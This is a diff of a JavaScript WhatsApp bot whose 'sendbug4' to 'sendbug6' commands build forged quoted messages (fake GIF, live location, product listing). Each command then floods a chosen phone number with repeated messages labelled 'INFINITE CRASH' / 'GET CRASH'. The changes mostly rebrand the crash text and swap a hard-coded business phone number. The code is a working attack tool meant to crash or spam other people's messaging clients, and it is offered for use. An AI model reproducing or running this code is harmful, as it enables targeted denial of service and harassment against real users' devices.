-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
 await m.reply(`Succes`)
 break
 case 'sendbug4':
@@ -5530,41 +5415,26 @@ message: { "videoMessage": {
 "title":"hallo bang","h": 
 `Hmm`,'seconds': '359996400', 
 'gifPlayback': 'true', 
-'caption': `CXZA 935`,
+'caption': `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
 }
 }
 }
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif})
 await m.reply(`Succes`)
 break 
 case 'sendbug5':
@@ -5576,41 +5446,26 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 liveLocationMessage: {
-caption: `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+caption: `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
 }
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc})
 await m.reply(`Succes`)
 break
 case 'sendbug6':
@@ -5627,43 +5482,28 @@ message: {
 "productImage":{ 
 "mimetype": "image/jpeg", 
 "jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
-"title": "CXZA 935", 
-"description": "CXZA 935", 
+"title": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓", 
+"description": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓", 
 "currencyCode": "USD", 
 "priceAmount1000": "5000000000", 
-"retailerId": "CXZA 935", 
+"retailerId": "© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓", 
 "productImageCount": 1}, 
-"businessOwnerJid": `6285775422460@s.whatsapp.net`}}}	
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+"businessOwnerJid": `6283149877456@s.whatsapp.net`}}}	
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:ftoko})
